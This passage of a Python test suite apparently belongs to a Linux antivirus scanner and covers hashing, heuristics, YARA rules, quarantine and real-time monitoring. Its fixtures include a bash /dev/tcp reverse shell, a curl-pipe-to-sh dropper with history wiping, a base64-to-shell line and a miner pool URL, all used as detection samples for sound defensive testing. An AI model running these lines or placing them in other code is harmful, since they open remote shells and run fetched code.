"""Test suite for Br1zz Security.

Uses only the standard library, so it runs on a stock Python without pip.

    python3 -m unittest discover -s tests -v

The XDG variables are redirected to a scratch directory *before* br1zz is
imported, because the package resolves its data paths at import time. Without
this the tests would write into the real quarantine vault.
"""

import json
import os
import re
import shutil
import stat
import sys
import tempfile
import unittest
from pathlib import Path

_SANDBOX = tempfile.mkdtemp(prefix="br1zz-tests-")
os.environ["XDG_DATA_HOME"] = str(Path(_SANDBOX, "data"))
os.environ["XDG_CONFIG_HOME"] = str(Path(_SANDBOX, "config"))

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from br1zz_security.config import (Config, ExceptionError, PACKAGE_DIR,  # noqa: E402
                                   QUARANTINE_DIR, ensure_dirs, normalize_exception)
from br1zz_security.engine.hashdb import HashDatabase, hash_bytes, hash_file  # noqa: E402
from br1zz_security.engine.heuristics import ElfInfo, Heuristics, is_text, shannon_entropy  # noqa: E402
from br1zz_security.engine.scanner import Scanner  # noqa: E402
from br1zz_security.engine.yara_engine import YARA_AVAILABLE, YaraEngine  # noqa: E402
from br1zz_security.engine.verdict import Detection, Severity, Status  # noqa: E402
from br1zz_security.quarantine import Quarantine, QuarantineError  # noqa: E402
from br1zz_security.realtime import RealtimeError, RealtimeMonitor  # noqa: E402
from br1zz_security import feeds, scanlog  # noqa: E402

# Assembled from fragments so this file is not itself an EICAR carrier on disk.
EICAR = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR" "-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
EICAR_SHA256 = "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"

REVERSE_SHELL = "#!/bin/bash\nbash -i >& /dev/tcp/198.51.100.7/4444 0>&1\n"
DROPPER = "#!/bin/sh\ncurl -s http://198.51.100.9/p.sh | sh\nhistory -c\nunset HISTFILE\n"
CLEAN_TEXT = "Shopping list\n- milk\n- bread\n"


def tearDownModule():
    shutil.rmtree(_SANDBOX, ignore_errors=True)


class TempDirTest(unittest.TestCase):
    def setUp(self):
        # Deliberately inside the module sandbox rather than /tmp. The tests
        # write live EICAR and reverse-shell samples, and /tmp is a default
        # real-time watch path - running the suite with protection on would
        # otherwise flood the user's app with detections of our own fixtures.
        self.tmp = Path(tempfile.mkdtemp(prefix="case-", dir=_SANDBOX))
        self.addCleanup(shutil.rmtree, self.tmp, True)

    def write(self, name: str, content: str, mode: int | None = None) -> Path:
        path = self.tmp / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content)
        if mode is not None:
            path.chmod(mode)
        return path

    def write_bytes(self, name: str, content: bytes) -> Path:
        path = self.tmp / name
        path.write_bytes(content)
        return path


# --------------------------------------------------------------------- hashes

class HashDatabaseTests(TempDirTest):
    def test_builtin_database_loads(self):
        db = HashDatabase().load()
        self.assertGreater(len(db), 0)
        self.assertTrue(db.sources)

    def test_eicar_digest_matches_published_value(self):
        path = self.write("eicar.com", EICAR)
        self.assertEqual(hash_file(path).sha256, EICAR_SHA256)

    def test_eicar_is_detected(self):
        db = HashDatabase().load()
        digests = hash_bytes(EICAR.encode())
        detection = db.lookup(digests)
        self.assertIsNotNone(detection)
        self.assertEqual(detection.name, "EICAR-Test-File")
        self.assertIs(detection.severity, Severity.CRITICAL)

    def test_clean_content_is_not_detected(self):
        db = HashDatabase().load()
        self.assertIsNone(db.lookup(hash_bytes(CLEAN_TEXT.encode())))

    def test_streaming_and_buffer_hashes_agree(self):
        payload = os.urandom(3 * 1024 * 1024)
        path = self.write_bytes("blob.bin", payload)
        self.assertEqual(hash_file(path).sha256, hash_bytes(payload).sha256)
        self.assertEqual(hash_file(path).md5, hash_bytes(payload).md5)

    def test_user_signature_can_be_added_and_matched(self):
        ensure_dirs()
        db = HashDatabase().load()
        payload = b"a distinctive sample body"
        digest = hash_bytes(payload).sha256
        db.add(digest, "Malware.Test.Custom", 100, "added by the test suite")
        reloaded = HashDatabase().load()
        hit = reloaded.lookup(hash_bytes(payload))
        self.assertIsNotNone(hit)
        self.assertEqual(hit.name, "Malware.Test.Custom")


# ----------------------------------------------------------------- heuristics

class EntropyTests(unittest.TestCase):
    def test_uniform_data_has_zero_entropy(self):
        self.assertAlmostEqual(shannon_entropy(b"\x00" * 4096), 0.0, places=6)

    def test_random_data_has_near_maximum_entropy(self):
        self.assertGreater(shannon_entropy(os.urandom(65536)), 7.9)

    def test_english_text_is_mid_range(self):
        entropy = shannon_entropy((CLEAN_TEXT * 200).encode())
        self.assertTrue(0.5 < entropy < 5.5, f"unexpected entropy {entropy}")

    def test_empty_input(self):
        self.assertEqual(shannon_entropy(b""), 0.0)


class TextDetectionTests(unittest.TestCase):
    def test_plain_text_is_text(self):
        self.assertTrue(is_text(CLEAN_TEXT.encode()))

    def test_binary_with_nul_is_not_text(self):
        self.assertFalse(is_text(b"\x7fELF\x02\x01\x00\x00binary"))

    def test_empty_is_not_text(self):
        self.assertFalse(is_text(b""))


class ElfParsingTests(unittest.TestCase):
    def test_parses_a_real_system_binary(self):
        for candidate in ("/bin/ls", "/usr/bin/ls", "/bin/true"):
            if Path(candidate).is_file():
                data = Path(candidate).read_bytes()
                break
        else:
            self.skipTest("no system ELF binary available")

        elf = ElfInfo(data)
        self.assertTrue(elf.valid)
        self.assertTrue(elf.is_64)
        names = {name for name, _, _ in elf.sections}
        self.assertIn(".text", names)

    def test_non_elf_is_rejected(self):
        self.assertFalse(ElfInfo(CLEAN_TEXT.encode()).valid)

    def test_truncated_elf_does_not_raise(self):
        elf = ElfInfo(b"\x7fELF\x02\x01\x01" + b"\x00" * 80)
        self.assertTrue(elf.valid)  # header is present
        self.assertEqual(elf.sections, [])


class HeuristicRuleTests(TempDirTest):
    def setUp(self):
        super().setUp()
        self.heuristics = Heuristics()

    def names_for(self, filename: str, content: str) -> set[str]:
        path = self.write(filename, content)
        return {d.name for d in self.heuristics.analyze(path, content.encode())}

    def test_reverse_shell_is_flagged(self):
        self.assertIn("HEUR:ReverseShell.DevTcp", self.names_for("a.sh", REVERSE_SHELL))

    def test_curl_pipe_shell_is_flagged(self):
        names = self.names_for("b.sh", "#!/bin/sh\ncurl -s http://x.test/a | bash\n")
        self.assertIn("HEUR:Dropper.CurlPipeShell", names)

    def test_history_wipe_is_flagged(self):
        names = self.names_for("c.sh", "#!/bin/bash\nhistory -c\nunset HISTFILE\n")
        self.assertIn("HEUR:AntiForensics.HistoryWipe", names)

    def test_miner_config_is_flagged(self):
        names = self.names_for("d.json", '{"pools":[{"url":"stratum+tcp://pool.test:3333"}]}')
        self.assertIn("HEUR:Miner.Stratum", names)

    def test_base64_exec_is_flagged(self):
        names = self.names_for("e.sh", "#!/bin/sh\necho aGk= | base64 -d | sh\n")
        self.assertIn("HEUR:Obfuscation.Base64Exec", names)

    def test_double_extension_is_flagged(self):
        names = self.names_for("invoice.pdf.sh", "#!/bin/sh\necho hi\n")
        self.assertIn("HEUR:Masquerade.DoubleExtension", names)

    def test_elf_named_as_document_is_flagged(self):
        path = self.tmp / "holiday.jpg"
        path.write_bytes(b"\x7fELF\x02\x01\x01" + b"\x00" * 200)
        names = {d.name for d in self.heuristics.analyze(path, path.read_bytes())}
        self.assertIn("HEUR:Masquerade.ExecutableAsDocument", names)

    def test_clean_text_produces_no_detections(self):
        self.assertEqual(self.names_for("notes.txt", CLEAN_TEXT), set())

    def test_ordinary_script_is_not_flagged(self):
        script = "#!/bin/bash\nset -euo pipefail\nfor f in *.txt; do\n  cp \"$f\" backup/\ndone\n"
        self.assertEqual(self.names_for("backup.sh", script), set())

    def test_binary_is_not_scanned_for_text_patterns(self):
        # The same bytes inside a binary must not trigger the script rules.
        payload = b"\x7fELF\x02\x01\x01" + b"\x00" * 64 + REVERSE_SHELL.encode() + b"\x00" * 64
        path = self.write_bytes("prog", payload)
        names = {d.name for d in self.heuristics.analyze(path, payload)}
        self.assertNotIn("HEUR:ReverseShell.DevTcp", names)


# -------------------------------------------------------------------- scanner

class ScannerClassificationTests(TempDirTest):
    def setUp(self):
        super().setUp()
        self.scanner = Scanner(Config.load()).load()

    def test_eicar_is_infected(self):
        verdict = self.scanner.scan_file(self.write("eicar.com", EICAR))
        self.assertIs(verdict.status, Status.INFECTED)
        self.assertEqual(verdict.name, "EICAR-Test-File")
        self.assertEqual(verdict.score, 100)

    def test_reverse_shell_is_infected(self):
        verdict = self.scanner.scan_file(self.write("rs.sh", REVERSE_SHELL))
        self.assertIs(verdict.status, Status.INFECTED)

    def test_dropper_is_flagged(self):
        verdict = self.scanner.scan_file(self.write("drop.sh", DROPPER))
        self.assertTrue(verdict.status.is_threat)

    def test_heuristics_alone_do_not_convict(self):
        # Two HIGH heuristics must corroborate, not add up to a conviction.
        # YARA is disabled explicitly so the result does not depend on whether
        # yara-python happens to be installed on the machine running the tests.
        config = Config.load()
        config.enable_yara = False
        scanner = Scanner(config).load()
        verdict = scanner.scan_file(self.write("drop.sh", DROPPER))
        self.assertIs(verdict.status, Status.SUSPICIOUS)

    def test_clean_file_is_clean(self):
        verdict = self.scanner.scan_file(self.write("notes.txt", CLEAN_TEXT))
        self.assertIs(verdict.status, Status.CLEAN)
        self.assertEqual(verdict.detections, [])

    def test_empty_file_is_clean(self):
        verdict = self.scanner.scan_file(self.write("empty.txt", ""))
        self.assertIs(verdict.status, Status.CLEAN)

    def test_missing_file_reports_error(self):
        verdict = self.scanner.scan_file(self.tmp / "does-not-exist")
        self.assertIs(verdict.status, Status.ERROR)
        self.assertTrue(verdict.error)

    def test_fifo_is_skipped_not_read(self):
        fifo = self.tmp / "pipe"
        os.mkfifo(fifo)
        verdict = self.scanner.scan_file(fifo)
        self.assertIs(verdict.status, Status.SKIPPED)

    def test_sha256_is_recorded(self):
        verdict = self.scanner.scan_file(self.write("eicar.com", EICAR))
        self.assertEqual(verdict.sha256, EICAR_SHA256)

    def test_hashdb_hit_outranks_everything(self):
        status, score = self.scanner._classify([
            Detection("EICAR-Test-File", "hashdb", Severity.CRITICAL),
            Detection("HEUR:Something", "heuristics", Severity.LOW),
        ])
        self.assertIs(status, Status.INFECTED)
        self.assertEqual(score, 100)

    def test_two_high_heuristics_stay_suspicious(self):
        status, _ = self.scanner._classify([
            Detection("HEUR:A", "heuristics", Severity.HIGH),
            Detection("HEUR:B", "heuristics", Severity.HIGH),
        ])
        self.assertIs(status, Status.SUSPICIOUS)

    def test_critical_heuristic_reaches_infected(self):
        status, _ = self.scanner._classify([
            Detection("HEUR:A", "heuristics", Severity.CRITICAL),
        ])
        self.assertIs(status, Status.INFECTED)

    def test_agreeing_engines_escalate(self):
        yara_only, yara_score = self.scanner._classify([
            Detection("R", "yara", Severity.HIGH),
        ])
        both, both_score = self.scanner._classify([
            Detection("R", "yara", Severity.HIGH),
            Detection("H", "heuristics", Severity.MEDIUM),
        ])
        self.assertGreater(both_score, yara_score)

    def test_low_signal_stays_clean(self):
        status, _ = self.scanner._classify([Detection("H", "heuristics", Severity.LOW)])
        self.assertIs(status, Status.CLEAN)

    def test_oversized_file_is_still_hashed(self):
        self.scanner.config.max_file_size = 1024
        payload = EICAR.encode() + b"\x00" * 4096
        path = self.write_bytes("big.bin", payload)
        verdict = self.scanner.scan_file(path)
        self.assertEqual(verdict.sha256, hash_bytes(payload).sha256)


class ScannerTraversalTests(TempDirTest):
    def setUp(self):
        super().setUp()
        self.scanner = Scanner(Config.load()).load()

    def test_finds_files_recursively(self):
        self.write("a.txt", "one")
        self.write("sub/b.txt", "two")
        self.write("sub/deep/c.txt", "three")
        found = {p.name for p in self.scanner.enumerate([self.tmp])}
        self.assertEqual(found, {"a.txt", "b.txt", "c.txt"})

    def test_excludes_are_honoured(self):
        self.write("keep.txt", "x")
        self.write("skip/ignored.txt", "y")
        self.scanner.config.excludes = [str(self.tmp / "skip")]
        found = {p.name for p in self.scanner.enumerate([self.tmp])}
        self.assertEqual(found, {"keep.txt"})

    def test_exception_added_at_runtime_is_honoured(self):
        self.write("keep.txt", "x")
        self.write("skip/ignored.txt", "y")
        self.scanner.config.excludes = []
        self.scanner.config.add_exception(str(self.tmp / "skip"))
        found = {p.name for p in self.scanner.enumerate([self.tmp])}
        self.assertEqual(found, {"keep.txt"})

    def test_exception_glob_is_honoured(self):
        self.write("keep.txt", "x")
        self.write("a/node_modules/dep.js", "y")
        self.write("b/node_modules/dep.js", "z")
        self.scanner.config.excludes = [str(self.tmp / "*" / "node_modules")]
        found = {p.name for p in self.scanner.enumerate([self.tmp])}
        self.assertEqual(found, {"keep.txt"})

    def test_excepted_file_is_not_scanned(self):
        # The point of a file-level exception: a known false positive stops
        # being reported without disabling the rule that caught it.
        sample = self.write("sample.txt", EICAR)
        self.assertTrue(any(p == sample for p in self.scanner.enumerate([self.tmp])))
        self.scanner.config.add_exception(str(sample))
        found = list(self.scanner.enumerate([self.tmp]))
        self.assertEqual(found, [])

    def test_package_directory_is_never_scanned(self):
        # The rules and signature files are full of malware patterns by design.
        found = list(self.scanner.enumerate([PACKAGE_DIR]))
        self.assertEqual(found, [])

    def test_install_root_is_never_scanned(self):
        # The checkout holds the YARA rules and this very test file, which
        # contain malware patterns and a live EICAR string by design. Scanning
        # them buries real findings under Br1zz detecting itself.
        from br1zz_security.config import INSTALL_ROOT
        found = list(self.scanner.enumerate([INSTALL_ROOT]))
        self.assertEqual(found, [], f"install root was scanned: {found[:3]}")

    def test_test_suite_files_are_excluded(self):
        from br1zz_security.config import INSTALL_ROOT
        excluded = self.scanner._excluded_roots()
        this_file = Path(__file__).resolve()
        self.assertTrue(
            any(root == this_file or root in this_file.parents for root in excluded),
            "the test suite carries EICAR and must be excluded",
        )
        self.assertIn(INSTALL_ROOT.resolve(), excluded)

    def test_data_and_config_dirs_are_excluded(self):
        from br1zz_security.config import CONFIG_DIR, DATA_DIR
        excluded = self.scanner._excluded_roots()
        self.assertIn(DATA_DIR.resolve(), excluded)
        self.assertIn(CONFIG_DIR.resolve(), excluded)

    def test_realtime_does_not_watch_own_directories(self):
        from br1zz_security.config import DATA_DIR, INSTALL_ROOT
        monitor = RealtimeMonitor(Config.load())
        monitor.scanner.load()
        self.assertFalse(monitor._should_watch(INSTALL_ROOT))
        self.assertFalse(monitor._should_watch(DATA_DIR))
        self.assertFalse(monitor._should_watch(QUARANTINE_DIR))

    def test_quarantine_vault_is_never_scanned(self):
        ensure_dirs()
        (QUARANTINE_DIR / "sample.qbin").write_bytes(b"encoded")
        found = list(self.scanner.enumerate([QUARANTINE_DIR]))
        self.assertEqual(found, [])

    def test_symlinks_are_not_followed_by_default(self):
        target = self.write("real.txt", "content")
        (self.tmp / "link.txt").symlink_to(target)
        found = [p.name for p in self.scanner.enumerate([self.tmp])]
        self.assertEqual(found, ["real.txt"])

    def test_hidden_files_can_be_excluded(self):
        self.write("visible.txt", "x")
        self.write(".hidden", "y")
        self.scanner.config.scan_hidden = False
        found = {p.name for p in self.scanner.enumerate([self.tmp])}
        self.assertEqual(found, {"visible.txt"})

    def test_full_scan_produces_a_summary(self):
        self.write("clean.txt", CLEAN_TEXT)
        self.write("eicar.com", EICAR)
        self.write("rs.sh", REVERSE_SHELL)
        summary = self.scanner.scan([self.tmp])
        self.assertEqual(summary.scanned, 3)
        self.assertEqual(summary.infected, 2)
        self.assertEqual(summary.clean, 1)
        self.assertEqual(summary.threat_count, 2)
        self.assertGreater(summary.bytes_read, 0)

    def test_unreadable_directory_does_not_abort_scan(self):
        self.write("ok.txt", "fine")
        locked = self.tmp / "locked"
        locked.mkdir()
        (locked / "secret.txt").write_text("hidden")
        locked.chmod(0o000)
        self.addCleanup(locked.chmod, 0o755)
        summary = self.scanner.scan([self.tmp])
        self.assertGreaterEqual(summary.scanned, 1)


# ----------------------------------------------------------------- quarantine

class QuarantineTests(TempDirTest):
    def setUp(self):
        super().setUp()
        ensure_dirs()
        self.scanner = Scanner(Config.load()).load()
        self.quarantine = Quarantine()
        # The vault is shared state across the module; start each case empty so
        # counts assert on what this test put there.
        self.quarantine.purge()

    def test_capture_removes_original_and_stores_entry(self):
        path = self.write("eicar.com", EICAR)
        verdict = self.scanner.scan_file(path)
        entry = self.quarantine.capture(verdict)
        self.assertFalse(path.exists())
        self.assertTrue(entry.vault_path.is_file())
        self.assertEqual(entry.threat, "EICAR-Test-File")

    def test_vault_copy_is_defanged(self):
        path = self.write("eicar.com", EICAR)
        entry = self.quarantine.capture(self.scanner.scan_file(path))
        stored = entry.vault_path.read_bytes()
        self.assertNotEqual(stored, EICAR.encode())
        self.assertNotIn(b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE", stored)

    def test_vault_copy_is_not_executable(self):
        path = self.write("payload.sh", REVERSE_SHELL, mode=0o755)
        entry = self.quarantine.capture(self.scanner.scan_file(path))
        mode = entry.vault_path.stat().st_mode
        self.assertFalse(mode & stat.S_IXUSR)
        self.assertFalse(mode & stat.S_IRGRP)

    def test_restore_returns_original_bytes(self):
        path = self.write("eicar.com", EICAR)
        entry = self.quarantine.capture(self.scanner.scan_file(path))
        restored = self.quarantine.restore(entry.id)
        self.assertEqual(restored.read_text(), EICAR)
        self.assertEqual(restored, path)

    def test_restore_preserves_permissions(self):
        path = self.write("payload.sh", REVERSE_SHELL, mode=0o750)
        entry = self.quarantine.capture(self.scanner.scan_file(path))
        restored = self.quarantine.restore(entry.id)
        self.assertEqual(stat.S_IMODE(restored.stat().st_mode), 0o750)

    def test_large_file_roundtrip(self):
        payload = os.urandom(2 * 1024 * 1024 + 7)  # not a chunk multiple
        path = self.write_bytes("big.bin", payload)
        verdict = self.scanner.scan_file(path)
        entry = self.quarantine.capture(verdict)
        restored = self.quarantine.restore(entry.id)
        self.assertEqual(restored.read_bytes(), payload)

    def test_restore_to_alternate_target(self):
        path = self.write("eicar.com", EICAR)
        entry = self.quarantine.capture(self.scanner.scan_file(path))
        target = self.tmp / "elsewhere" / "recovered.txt"
        restored = self.quarantine.restore(entry.id, target=target)
        self.assertEqual(restored, target)
        self.assertEqual(target.read_text(), EICAR)

    def test_restore_refuses_to_overwrite_without_force(self):
        path = self.write("eicar.com", EICAR)
        entry = self.quarantine.capture(self.scanner.scan_file(path))
        path.write_text("something new lives here now")
        with self.assertRaises(QuarantineError):
            self.quarantine.restore(entry.id)
        self.quarantine.restore(entry.id, force=True)
        self.assertEqual(path.read_text(), EICAR)

    def test_tampered_vault_copy_fails_integrity_check(self):
        path = self.write("eicar.com", EICAR)
        entry = self.quarantine.capture(self.scanner.scan_file(path))
        entry.vault_path.write_bytes(b"corrupted content")
        with self.assertRaises(QuarantineError) as ctx:
            self.quarantine.restore(entry.id)
        self.assertIn("integrity", str(ctx.exception))

    def test_delete_removes_entry_and_file(self):
        path = self.write("eicar.com", EICAR)
        entry = self.quarantine.capture(self.scanner.scan_file(path))
        vault_file = entry.vault_path
        self.quarantine.delete(entry.id)
        self.assertFalse(vault_file.exists())
        self.assertIsNone(self.quarantine.get(entry.id))

    def test_short_id_prefix_resolves(self):
        path = self.write("eicar.com", EICAR)
        entry = self.quarantine.capture(self.scanner.scan_file(path))
        self.assertIsNotNone(self.quarantine.get(entry.id[:12]))

    def test_unknown_id_raises(self):
        with self.assertRaises(QuarantineError):
            self.quarantine.restore("nonexistent-id")

    def test_index_persists_across_instances(self):
        path = self.write("eicar.com", EICAR)
        entry = self.quarantine.capture(self.scanner.scan_file(path))
        self.assertIsNotNone(Quarantine().get(entry.id))

    def test_purge_empties_the_vault(self):
        for name in ("a.com", "b.com"):
            self.quarantine.capture(self.scanner.scan_file(self.write(name, EICAR)))
        removed = self.quarantine.purge()
        self.assertEqual(removed, 2)
        self.assertEqual(len(self.quarantine), 0)


# ----------------------------------------------------------- false positives

class FalsePositiveTests(TempDirTest):
    """Regression tests for real false positives found against a live /usr/bin.

    An earlier revision of the rules flagged git, bash, systemctl, snap and the
    pam.d configs, because rules matched strings co-occurring anywhere in a file
    rather than being part of the same statement.
    """

    def setUp(self):
        super().setUp()
        self.scanner = Scanner(Config.load()).load()

    def assertClean(self, path: Path):
        verdict = self.scanner.scan_file(path)
        self.assertIs(
            verdict.status, Status.CLEAN,
            f"{path.name} was flagged as {verdict.status.value}: "
            f"{[d.name for d in verdict.detections]}",
        )

    def test_pam_config_is_clean(self):
        # Names /etc/shadow legitimately; must not read as credential theft.
        self.assertClean(self.write("common-auth", (
            "auth\t[success=1 default=ignore]\tpam_unix.so nullok\n"
            "auth\trequisite\t\t\tpam_deny.so\n"
            "# see /etc/shadow for the password database\n"
        )))

    def test_systemd_management_script_is_clean(self):
        self.assertClean(self.write("deb-systemd-helper", (
            "#!/usr/bin/perl\n"
            "my $dir = '/etc/systemd/system/';\n"
            "system('systemctl', 'enable', $unit);\n"
            "print \"enabled $unit\\n\";\n"
        )))

    def test_ssh_copy_id_style_script_is_clean(self):
        self.assertClean(self.write("ssh-copy-id", (
            "#!/bin/sh\n"
            "# installs your public key into ~/.ssh/authorized_keys on a remote host\n"
            "DEFAULT_PUB_ID_FILE=$HOME/.ssh/id_rsa.pub\n"
            "printf '%s\\n' \"$NEW_IDS\" | ssh \"$@\" \"cat >> ~/.ssh/authorized_keys\"\n"
        )))

    def test_backup_script_with_chmod_is_clean(self):
        self.assertClean(self.write("release.sh", (
            "#!/bin/bash\n"
            "set -euo pipefail\n"
            "curl -sSf -o dist/app.tar.gz https://internal.example/app.tar.gz\n"
            "tar xzf dist/app.tar.gz\n"
            "# ... many lines later, unrelated ...\n"
            + "echo building\n" * 60
            + "chmod +x scripts/entrypoint.sh\n"
        )))

    def test_cron_management_script_is_clean(self):
        self.assertClean(self.write("cronjobs.sh", (
            "#!/bin/sh\n"
            "# list jobs from /etc/cron.daily/ and /var/spool/cron\n"
            "ls /etc/cron.daily/\n"
            "crontab -l\n"
        )))

    def test_debugger_strings_in_binary_are_clean(self):
        # strace/gdb legitimately contain all of these.
        payload = (b"\x7fELF\x02\x01\x01" + b"\x00" * 120
                   + b"PTRACE_TRACEME\x00TracerPid\x00/proc/self/status\x00"
                   + b"\x00" * 200)
        self.assertClean(self.write_bytes("strace", payload))

    def test_shell_strings_in_binary_are_clean(self):
        # bash itself contains .bashrc, /dev/tcp/ and curl-ish strings.
        payload = (b"\x7fELF\x02\x01\x01" + b"\x00" * 120
                   + b"/dev/tcp/\x00.bashrc\x00/etc/systemd/system/\x00curl\x00"
                   + b"authorized_keys\x00/etc/ld.so.preload\x00"
                   + b"\x00" * 200)
        self.assertClean(self.write_bytes("bash", payload))

    def test_embedded_base64_is_not_enough_to_flag(self):
        # SVG icons, certificates and crypto constants are full of long base64.
        # 24 files in /usr/share were flagged for this alone.
        svg = ('<svg xmlns="http://www.w3.org/2000/svg"><image href="data:image/png;base64,'
               + "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk" * 40
               + '"/></svg>\n')
        self.assertClean(self.write("icon.svg", svg))

    def test_crypto_constants_are_not_enough_to_flag(self):
        module = ("# large prime constants\n"
                  "P = 0x" + "FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1" * 12 + "\n"
                  "KEY = '" + "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVph" * 30 + "'\n")
        self.assertClean(self.write("kex_group16.py", module))

    def test_javascript_fromcharcode_is_not_enough_to_flag(self):
        self.assertClean(self.write("app.js", (
            "function decode(c) { return String.fromCharCode(c); }\n"
            "var s = String.fromCharCode(72) + String.fromCharCode(105);\n"
        )))

    def test_single_miner_keyword_does_not_flag(self):
        # 'XMriG' is a printer model in CUPS' PPD list; 'randomx' is a package
        # name in lto-disabled-list. Both were flagged as coin miners.
        self.assertClean(self.write("openprinting-ppds", "Xerox XMriG 3000 Series\nHP LaserJet\n"))
        self.assertClean(self.write("lto-disabled-list", "randomx\nzlib\nopenssl\n"))

    def test_miner_pool_url_still_flags(self):
        verdict = self.scanner.scan_file(
            self.write("cfg.json", '{"pools":[{"url":"stratum+tcp://pool.test:3333"}]}')
        )
        self.assertTrue(verdict.status.is_threat)

    def test_large_base64_file_scans_quickly(self):
        # Guards the O(n^2) regex: an unbounded {600,} against 7 MB of base64
        # took over 120 seconds and hit the YARA scan timeout.
        import time
        blob = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVph" * 120_000  # ~4 MB
        path = self.write("ppd-data.txt", blob)
        start = time.monotonic()
        verdict = self.scanner.scan_file(path)
        elapsed = time.monotonic() - start
        self.assertLess(elapsed, 20.0, f"scanning 4 MB of base64 took {elapsed:.1f}s")
        self.assertIs(verdict.status, Status.CLEAN)

    def test_engine_failure_is_not_a_detection(self):
        # A YARA timeout must never look like corroborating evidence: doing so
        # combined with one LOW heuristic to push clean files to SUSPICIOUS.
        from br1zz_security.engine.verdict import Detection, Severity
        status, score = self.scanner._classify([
            Detection("HEUR:Obfuscation.LongBase64", "heuristics", Severity.LOW),
        ])
        self.assertIs(status, Status.CLEAN)
        self.assertLess(score, 50)

    def test_sample_of_real_system_binaries_is_clean(self):
        candidates = sorted(Path("/usr/bin").glob("*"))[:120]
        binaries = [p for p in candidates if p.is_file() and not p.is_symlink()]
        if not binaries:
            self.skipTest("/usr/bin is not populated")
        flagged = []
        for path in binaries:
            verdict = self.scanner.scan_file(path)
            if verdict.status.is_threat:
                flagged.append((path.name, verdict.name))
        self.assertEqual(flagged, [], f"false positives on system binaries: {flagged}")


@unittest.skipUnless(YARA_AVAILABLE, "yara-python is not installed")
class YaraScopeTests(TempDirTest):
    """The rule split is a performance contract, not just an arrangement.

    YARA matches every string in a ruleset before evaluating any condition, so
    text-only regex rules must not be in the ruleset that binaries are matched
    against. Measured cost of getting this wrong: 13 MB/s versus 96 MB/s.
    """

    def setUp(self):
        super().setUp()
        self.engine = YaraEngine().load()

    def test_both_scopes_compile(self):
        self.assertIsNotNone(self.engine.rules_any, self.engine.errors)
        self.assertIsNotNone(self.engine.rules_text, self.engine.errors)
        self.assertEqual(self.engine.errors, [])

    def test_binary_scope_rules_stay_cheap(self):
        # No regular expressions may appear in the 'any' rules: they are matched
        # against every shared library on the system.
        from br1zz_security.config import RULES_ANY_DIR
        for rule_file in RULES_ANY_DIR.glob("*.yar"):
            body = rule_file.read_text()
            in_strings = False
            for line in body.splitlines():
                stripped = line.strip()
                if stripped.startswith("strings:"):
                    in_strings = True
                    continue
                if stripped.startswith("condition:"):
                    in_strings = False
                if in_strings and re.search(r"=\s*/", stripped):
                    self.fail(f"regex string in always-on ruleset {rule_file.name}: {stripped}")

    def test_text_rules_do_not_run_on_binaries(self):
        # A binary carrying a reverse-shell string must not match the text rule.
        payload = b"\x7fELF\x02\x01\x01" + b"\x00" * 64 + REVERSE_SHELL.encode() + b"\x00" * 64
        names = {d.name for d in self.engine.match(payload, is_text=False)}
        self.assertNotIn("Backdoor.Linux.ReverseShell.DevTcp", names)

    def test_text_rules_do_run_on_text(self):
        names = {d.name for d in self.engine.match(REVERSE_SHELL.encode(), is_text=True)}
        self.assertIn("Backdoor.Linux.ReverseShell.DevTcp", names)

    def test_binary_scope_rules_run_on_binaries(self):
        payload = b"\x7fELF\x02\x01\x01" + b"\x00" * 100 + b"stratum+tcp://pool.test:3333" + b"\x00" * 50
        names = {d.name for d in self.engine.match(payload, is_text=False)}
        self.assertIn("Trojan.Linux.CoinMiner", names)

    def test_eicar_matches_in_either_scope(self):
        for is_text in (True, False):
            names = {d.name for d in self.engine.match(EICAR.encode(), is_text=is_text)}
            self.assertIn("EICAR-Test-File", names)


# ------------------------------------------------------------------ realtime

class RealtimeTests(TempDirTest):
    """Real-time protection, driven by actual filesystem events.

    These write real files and wait for inotify rather than calling the
    handler directly, because the parts most likely to break are the event
    decoding and the dynamic watch management, not the scanning.
    """

    TIMEOUT = 8.0

    def setUp(self):
        super().setUp()
        self.config = Config.load()
        self.config.realtime_paths = [str(self.tmp)]
        self.config.auto_quarantine = False
        self.config.realtime_notify = False
        self.found = []
        self.monitor = RealtimeMonitor(self.config, on_threat=self.found.append)

    def start(self):
        self.monitor.start()
        self.addCleanup(self.monitor.stop)

    def wait_for(self, count: int, timeout: float | None = None) -> bool:
        import time
        deadline = time.monotonic() + (self.TIMEOUT if timeout is None else timeout)
        while time.monotonic() < deadline:
            if len(self.found) >= count:
                return True
            time.sleep(0.05)
        return False

    def test_detects_a_file_written_after_start(self):
        self.start()
        self.write("eicar.com", EICAR)
        self.assertTrue(self.wait_for(1), "no detection within timeout")
        self.assertEqual(self.found[0].name, "EICAR-Test-File")

    def test_clean_file_is_not_reported(self):
        self.start()
        self.write("notes.txt", CLEAN_TEXT)
        self.write("eicar.com", EICAR)
        self.assertTrue(self.wait_for(1))
        self.assertEqual(len(self.found), 1)
        self.assertEqual(self.found[0].path.name, "eicar.com")

    def test_detects_file_moved_in(self):
        outside = Path(tempfile.mkdtemp(prefix="outside-", dir=_SANDBOX))
        self.addCleanup(shutil.rmtree, outside, True)
        staged = outside / "payload.com"
        staged.write_text(EICAR)
        self.start()
        staged.rename(self.tmp / "payload.com")
        self.assertTrue(self.wait_for(1), "moved-in file was not detected")

    def test_watches_directories_created_after_start(self):
        self.start()
        nested = self.tmp / "a" / "b"
        nested.mkdir(parents=True)
        import time
        time.sleep(0.4)  # let the watch get installed
        (nested / "deep.sh").write_text(REVERSE_SHELL)
        self.assertTrue(self.wait_for(1), "file in a new subdirectory was missed")
        self.assertEqual(self.found[0].path.name, "deep.sh")

    def test_exception_added_while_running_takes_effect(self):
        # The directory is already watched by the time the exception is added,
        # so this only passes if exclusion is re-checked per file rather than
        # trusted from watch time.
        skipped = self.tmp / "vendor"
        skipped.mkdir()
        self.start()
        self.config.add_exception(str(skipped))
        (skipped / "eicar.com").write_text(EICAR)
        # A shorter wait than the positive cases on purpose: this one has to
        # burn its whole timeout every run, and detection normally lands in
